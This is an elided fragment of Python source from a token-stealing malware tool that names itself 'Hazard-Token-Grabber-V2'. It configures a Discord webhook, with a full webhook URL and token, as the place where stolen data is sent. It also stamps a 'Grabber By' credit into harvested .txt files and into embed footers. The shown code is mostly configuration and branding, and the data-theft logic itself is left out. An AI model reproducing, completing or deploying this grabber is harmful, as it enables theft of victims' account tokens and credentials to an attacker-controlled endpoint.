...
config = {
    # replace https://discord.com/api/webhooks/966752429095919617/5rD5kO4NAxMVoYyYb-2O_FSyWgX03SrbiJdzehEe7jHuCRcN4dfXcYUYiqFeQBQMzlWR with your webhook
    'webhook': "https://discord.com/api/webhooks/966752429095919617/5rD5kO4NAxMVoYyYb-2O_FSyWgX03SrbiJdzehEe7jHuCRcN4dfXcYUYiqFeQBQMzlWR",
            ...
            if i.endswith('.txt'):
                ...
                with open(path, "r", errors="ignore") as ff:
                    ...
                    with open(path, "w", encoding="utf-8") as f:
                        f.write(
                            "Grabber By github.com/Rdimohttps://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
            ...
            'embeds': [
                {
                    ...
                    'footer': {
                        'text': 'Grabber By github.com/Rdimohttps://github.com/Rdimo/Hazard-Token-Grabber-V2'
                    }
                }
            ]
        }
